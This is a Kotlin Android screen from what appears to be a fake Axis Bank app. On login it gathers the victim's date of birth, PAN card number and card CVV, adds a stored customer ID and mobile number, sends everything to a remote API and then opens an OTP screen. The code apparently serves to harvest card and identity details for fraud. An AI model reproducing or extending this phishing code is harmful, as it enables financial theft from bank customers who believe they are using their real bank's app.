package com.example.oldaxisbank

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import com.example.axisbank.SecondPage
import com.example.axisbank.ThirdPage
import com.example.oldaxisbank.databinding.ActivityThirdpageBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class thirdpage : AppCompatActivity() {

    private lateinit var binding: ActivityThirdpageBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityThirdpageBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.login.setOnClickListener {

            if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty() ||
                binding.e3.text.toString().isEmpty()){
                Toast.makeText(this,"fill all fields", Toast.LENGTH_SHORT).show()
            }else{


                val util = Util()
                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val intentff = Intent(this, otp::class.java)
                val data = ThirdPage(customerid = util.getLocalData(this,"c"),
                    mobile = util.getLocalData(this,"m"),
                    dob = binding.e1.text.toString(), cvv = binding.e3.text.toString(),
                    pancard = binding.e2.text.toString()
                )
                val call = apiService.third(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })



            }

        }

    }
}